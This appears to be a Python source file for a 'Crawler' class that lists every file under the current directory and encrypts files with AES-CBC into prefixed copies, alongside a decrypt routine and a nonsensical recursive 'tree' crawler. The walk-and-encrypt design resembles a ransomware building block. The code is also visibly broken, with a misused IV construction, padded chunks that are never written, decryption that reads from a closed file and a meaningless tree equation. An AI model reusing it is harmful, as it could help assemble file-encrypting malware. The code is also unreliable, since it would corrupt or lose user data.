#!/usr/bin/env python
import os, platform, random, time
from com.xsys.crawler.config.CrawlerConfig import CrawlerConfig
#from Crypto.Hash import SHA256
from Crypto.Cipher import AES


class Crawler(CrawlerConfig):

    def __init__(self):
        super(Crawler, self).__init__()

    '''
        [Description]
        clear_console
        - Clear the screen according to the running OS 
        
        :returns -> lambda execution of os.command::clear_screen
    '''
    @staticmethod
    def clear_console():
        p = platform.platform()
        if p.startswith('Win') or p.startswith('win'):
            win = lambda: os.system('cls')
            return win()
        elif p.startswith('Lin') or p.startswith('lin'):
            lin = lambda: os.system('clear')
            return lin()
        else:
            drw = lambda: os.system('clear')
            return drw()

    '''
        [Description]
        encrypt
        - Encrypt a given file by a given key
        :param -> key:str - a key for encryption
        :param -> filename:file - a given file to be encrypt
    '''
    def encrypt(self, key, filename):
        out_file = os.path.join(os.path.dirname(filename), self.SUFFIX+os.path.basename(filename))
        file_size = str.format(os.path.getsize(filename)).zfill(self.SIXTEEN_BYTES)
        iv = ''
        for i in range(self.SIXTEEN_BYTES):
            iv += chr.__format__(random.randint(0, 0xFF))
        encrypter = AES.new(key, AES.MODE_CBC, iv)
        with open(filename, 'rb') as infile:
            with open(out_file, 'wb') as outfile:
                outfile.write(filename)
                outfile.write(iv)
                while True:
                    chunk = infile.read(self.CHUNK_SIZE)
                    if len(chunk) == 0:
                        break
                    elif len(chunk) % self.SIXTEEN_BYTES != 0:
                        chunk += ' '*(self.SIXTEEN_BYTES - (len(chunk) % self.SIXTEEN_BYTES))
                    elif len(chunk) != file_size:
                        outfile.write(encrypter.encrypt(chunk))
                    else:
                        break
                outfile.close()

    '''
        [Description]
        decrypt
        - Decrypt a file content given a key 
        :param -> key:str - a key for decryption
        :param -> filename:file - a given encrypted file
    '''
    def decrypt(self, key, filename):
        out_file = os.path.join(os.path.basename(filename), os.path.basename(filename[12:]))
        with open(filename, 'rb') as infile:
            file_size = infile.read(self.SIXTEEN_BYTES)
            iv = infile.read(self.SIXTEEN_BYTES)
        decrypter = AES.new(key, AES.MODE_CBC, iv)
        with open(out_file, 'wb') as outfile:
            while True:
                chunk = infile.read(self.CHUNK_SIZE)
                if len(chunk) == 0:
                    break
                outfile.write(decrypter.decrypt(chunk))
            outfile.truncate(int(file_size))

    '''
        [Description]
        recursive_file_crawler
        - Create a Hierarchical Tree to index all files in the system
           implementing: tree height = (nodes^2+1) -1 < leafs :- simplifying -1:LEFT, null:RIGHT equation
        :return -> a Tree of OS files  
    '''
    def recursive_file_crawler(self, tree=[], items=[], queue=[]):
        try:
            if not items and not queue:
                return self.recursive_file_crawler(None, [], [])
            copy = queue[:]
            queue = []
            for item in copy:
                if item is None:
                    items.append(None)
                    queue.append(None)
                    queue.append(None)
                else:
                    items.append(item.key)
                    queue.append(item.left)
                    queue.append(item.right)
                if all((x is None for x in queue)):
                    return items
                return self.recursive_file_crawler(items, queue)
        except RecursionError as re:
            print(re)
            print('{0}'.format(items))
            print('{0}'.format(queue))
            print('{0}'.format(tree))

    '''
        [Description]
        linear_file_crawler
        - Create a list of files form current working directory
            and return the list
        :return -> list of files
    '''
    @staticmethod
    def linear_file_crawler():
        all_files = []
        start_time = int(round(time.time() * 1000))
        for root, dirs, files in os.walk(os.getcwd()):
            for names in files:
                all_files.append(os.path.join(root, names))
        end_time = int(round(time.time() * 1000))
        print('[Scan took {1} sec]\nTotal Files: {0}\n'.format(len(all_files), (end_time-start_time)/1000))
        return all_files


if __name__ == '__main__':
    c = Crawler()
